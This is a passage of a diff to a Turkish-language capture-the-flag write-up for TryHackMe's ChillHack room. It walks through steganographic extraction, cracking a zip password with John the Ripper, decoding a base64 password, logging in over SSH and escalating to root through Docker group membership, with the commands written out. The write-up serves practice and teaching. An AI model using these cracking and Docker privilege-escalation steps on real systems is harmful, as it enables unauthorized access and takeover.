@@ -245,4 +245,94 @@ Bu bilgilerle bir yere varamadım geri dönüp başka dosyalara göz atmaya kara
 </center>
 ```
 
+Images dizininin içinde, içinde gizli bir dosya olup olmadığını kontrol edebileceğimiz bir resim var. Hedefin içinde bir Python web sunucusu başlatalım:
+
+```
+python3 -m http.server 1234 
+```
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a10.png?raw=true)
+
+
+Daha sonra kaliye dönerek fotoğrafı makinemize indirelim.
+
+```
+wget http://10.10.28.212:1234/hacker-with-laptop_23-2147985341.jpg
+```
+
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a11.png?raw=true)
+
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a12.png?raw=true)
+
+steghide ile fotoğrafın içinde gizli bir dosya olup olmadığına bakalım.
+
+```
+┌──(root㉿r3tr0)-[~]
+└─# steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
+Enter passphrase: 
+wrote extracted data to "backup.zip".
+
+ ```                                                                                                          
+Fotoğrafın içinde backup.zip adlı dosya bulduk.
+
+Şifreyi kırmak için JohnTheRipper'ı kullanalım. Ancak önce zip dosyasını John'un şifreyi kırmak için kullanabileceği bir formata dönüştürmemiz gerekiyor. Bunu yapmak için zip2john'u kullanıyoruz:
+
+ ```                                                                                                          
+zip2john backup.zip > zipToJohnFile 
+ ```
+Dosyayı oluşturduktan sonra john ile şifreyi kırıyoruz.
+
+ ```
+┌──(root㉿r3tr0)-[~]
+└─# john zipToJohnFile --wordlist=/usr/share/wordlists/rockyou.txt 
+ ```
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a13.png?raw=true)
+
+>pass1word
+
+zip dosyasını şifreyi girip açtığımızda içinde source_code.php isimli php dosyasının olduğunu görüyoruz.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a14.png?raw=true)
+
+Dosyanın içerisinde base64 ile kodlanmış bir şifre var kırıp ne olduğunu görelim.
+
+ ```
+┌──(root㉿r3tr0)-[~]
+└─# echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 --decode
+!d0ntKn0wmYp@ssw0rd                                                                                          
+ ```
+
+Anurodh kullanıcısının şifresini bulduk. SSH ile giriş yapalım.
+
+```
+anurodh@ubuntu:~$ id
+uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)                                          
+```
+
+anurodh kullanıcısının 999(docker) grubunda olduğunu görüyoruz.
+
+İnternette biraz araştırma yaptım. Docker ile yetki yükseltme kodlarını paylaşan bir [web sitesi](https://keiran.scot/2020/07/05/privilege-escalation-with-docker/) buldum.
+
+Aşağıdaki komutu çalıştırarak yetkimizi yükseltebiliriz.
+
+```
+docker run -it -v /:/mnt alpine chroot /mnt sh
+```
+
+```
+anurodh@ubuntu:~$ docker run -it -v /:/mnt alpine chroot /mnt sh                                              
+# whoami
+root
+```
+
+Root olduğumuza göre root bayrağını alabiliriz.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a15.png?raw=true)
+
+>{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
+
+Ve böylelikle bir ctf daha tamamladık gelecek yazılarımda görüşmek üzere.
 
